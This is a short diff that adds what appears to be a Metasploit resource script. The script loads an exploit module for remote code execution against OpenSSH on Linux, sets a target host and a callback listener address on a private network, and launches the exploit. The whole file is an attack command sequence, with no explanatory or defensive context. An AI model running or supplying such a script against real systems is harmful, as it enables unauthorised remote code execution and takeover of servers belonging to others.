@@ -1,0 +1,5 @@
+
+use exploit/linux/ssh/openssh_rce
+set RHOSTS 192.168.0.1
+set LHOST 192.168.0.2
+exploit
